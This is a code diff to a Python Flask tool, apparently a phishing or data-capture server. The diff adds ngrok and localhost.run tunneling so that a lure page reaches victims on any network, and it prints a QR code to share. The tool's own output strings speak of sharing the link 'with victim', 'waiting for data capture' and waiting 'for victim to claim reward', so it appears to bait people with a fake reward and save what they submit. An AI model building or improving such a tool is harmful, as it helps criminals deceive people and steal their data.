@@ -6,6 +6,7 @@ import json
 import csv
 import subprocess
 import socket
+import requests
 from datetime import datetime
 from typing import Optional
 
@@ -17,7 +18,7 @@ try:
     from colorama import init as colorama_init, Fore, Style, Back
     import base64
 except Exception as e:
-    print("Missing packages. Install: pip install flask qrcode pillow colorama")
+    print("Missing packages. Install: pip install flask qrcode pillow colorama requests")
     print(f"Error: {e}")
     sys.exit(1)
 
@@ -75,6 +76,114 @@ def show_tool_lock_screen():
     print(f"\n{Fore.GREEN}✅ Tool unlocked! Starting server...{Style.RESET_ALL}")
     time.sleep(2)
 
+def install_ngrok():
+    """Install ngrok if not available"""
+    try:
+        print(f"{Fore.CYAN}📦 Checking ngrok installation...{Style.RESET_ALL}")
+        result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"{Fore.GREEN}✅ ngrok is already installed{Style.RESET_ALL}")
+            return True
+    except:
+        pass
+    
+    print(f"{Fore.YELLOW}📥 ngrok not found. Installing...{Style.RESET_ALL}")
+    try:
+        # Install ngrok on Termux
+        result = subprocess.run(['pkg', 'install', 'ngrok', '-y'], capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"{Fore.GREEN}✅ ngrok installed successfully{Style.RESET_ALL}")
+            return True
+        else:
+            print(f"{Fore.RED}❌ Failed to install ngrok via pkg{Style.RESET_ALL}")
+    except:
+        print(f"{Fore.RED}❌ Could not install ngrok{Style.RESET_ALL}")
+    
+    return False
+
+def start_ngrok_tunnel():
+    """Start ngrok tunnel and get public URL"""
+    try:
+        print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
+        
+        # Start ngrok in background
+        ngrok_process = subprocess.Popen(['ngrok', 'http', str(PORT)], 
+                                       stdout=subprocess.DEVNULL, 
+                                       stderr=subprocess.DEVNULL)
+        
+        # Wait for ngrok to start
+        time.sleep(5)
+        
+        # Get ngrok public URL from API
+        try:
+            response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
+            if response.status_code == 200:
+                tunnels = response.json().get('tunnels', [])
+                for tunnel in tunnels:
+                    if tunnel['proto'] == 'https':
+                        public_url = tunnel['public_url']
+                        print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
+                        return public_url
+        except Exception as e:
+            print(f"{Fore.YELLOW}⚠️  Could not fetch ngrok URL: {e}{Style.RESET_ALL}")
+        
+        # Alternative method - try to get URL from ngrok process
+        print(f"{Fore.YELLOW}🔄 Trying alternative method to get URL...{Style.RESET_ALL}")
+        time.sleep(3)
+        
+        try:
+            response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
+            tunnels = response.json().get('tunnels', [])
+            for tunnel in tunnels:
+                if tunnel['proto'] == 'https':
+                    public_url = tunnel['public_url']
+                    print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
+                    return public_url
+        except:
+            pass
+        
+        print(f"{Fore.RED}❌ Could not get ngrok URL. Check http://localhost:4040 manually{Style.RESET_ALL}")
+        return None
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ Ngrok error: {e}{Style.RESET_ALL}")
+        return None
+
+def start_localhost_run():
+    """Alternative: Use localhost.run for tunneling"""
+    try:
+        print(f"{Fore.CYAN}🌐 Trying localhost.run...{Style.RESET_ALL}")
+        
+        # Start localhost.run tunnel
+        process = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'], 
+                                 stdout=subprocess.PIPE, 
+                                 stderr=subprocess.PIPE,
+                                 text=True)
+        
+        # Wait for tunnel to establish
+        time.sleep(8)
+        
+        # Try to read the URL from output
+        import select
+        ready, _, _ = select.select([process.stdout], [], [], 5)
+        if ready:
+            output = process.stdout.readline()
+            if 'localhost.run' in output:
+                # Extract URL from output
+                import re
+                urls = re.findall(r'https://[a-zA-Z0-9-]+\.localhost\.run', output)
+                if urls:
+                    public_url = urls[0]
+                    print(f"{Fore.GREEN}✅ localhost.run URL: {public_url}{Style.RESET_ALL}")
+                    return public_url
+        
+        print(f"{Fore.YELLOW}⚠️  localhost.run started but URL not captured{Style.RESET_ALL}")
+        return "localhost_run_active"
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ localhost.run error: {e}{Style.RESET_ALL}")
+        return None
+
 def display_banner():
     """Display the main banner"""
     os.system('clear' if os.name == 'posix' else 'cls')
@@ -116,7 +225,18 @@ def display_qr_in_termux(url):
         print(f"{Fore.RED}❌ QR generation failed: {e}{Style.RESET_ALL}")
         return False
 
-# SIMPLIFIED HTML PAGE - Works without camera access
+def get_local_ip():
+    """Get local IP address"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
+
+# HTML PAGE (same as before)
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -701,17 +821,6 @@ def report():
         print(f"{Fore.RED}❌ Server Error: {e}{Style.RESET_ALL}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-def get_local_ip():
-    """Get local IP address"""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except:
-        return "127.0.0.1"
-
 def main():
     # Show lock screen first
     show_tool_lock_screen()
@@ -723,17 +832,46 @@ def main():
     local_ip = get_local_ip()
     local_url = f"http://{local_ip}:{PORT}"
     
+    print(f"\n{Back.BLUE}{Fore.WHITE}{' TUNNELING OPTIONS ':=^60}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}1. Ngrok Tunnel (Recommended){Style.RESET_ALL}")
+    print(f"{Fore.BLUE}2. localhost.run (Alternative){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}3. Local Network Only (Same WiFi){Style.RESET_ALL}")
+    print(f"{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
+    
+    choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-3): {Style.RESET_ALL}").strip()
+    
+    public_url = None
+    
+    if choice == '1':
+        if install_ngrok():
+            public_url = start_ngrok_tunnel()
+        else:
+            print(f"{Fore.RED}❌ Ngrok installation failed. Using local network.{Style.RESET_ALL}")
+    elif choice == '2':
+        public_url = start_localhost_run()
+    elif choice == '3':
+        print(f"{Fore.YELLOW}📡 Using local network only (works on same WiFi){Style.RESET_ALL}")
+    else:
+        print(f"{Fore.RED}❌ Invalid choice. Using local network.{Style.RESET_ALL}")
+    
+    # Determine final URL to use
+    final_url = public_url if public_url else local_url
+    
     # Display results
     print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}🌐 Direct Link: {local_url}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🌐 Public URL: {final_url}{Style.RESET_ALL}")
+    if public_url:
+        print(f"{Fore.GREEN}✅ This link works on ANY device and ANY network!{Style.RESET_ALL}")
+    else:
+        print(f"{Fore.YELLOW}⚠️  This link only works on the same WiFi network{Style.RESET_ALL}")
     print(f"{Fore.GREEN}📁 Save Location: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
     
     # Display QR code directly in Termux
-    display_qr_in_termux(local_url)
+    display_qr_in_termux(final_url)
     
-    print(f"\n{Fore.YELLOW}🚀 Share the link/QR with victim{Style.RESET_ALL}")
-    print(f"{Fore.RED}🔴 Waiting for data capture...{Style.RESET_ALL}")
+    print(f"\n{Fore.YELLOW}🚀 Share this link/QR with ANY device{Style.RESET_ALL}")
+    print(f"{Fore.RED}🔴 Waiting for victim to claim reward...{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
     
     try:
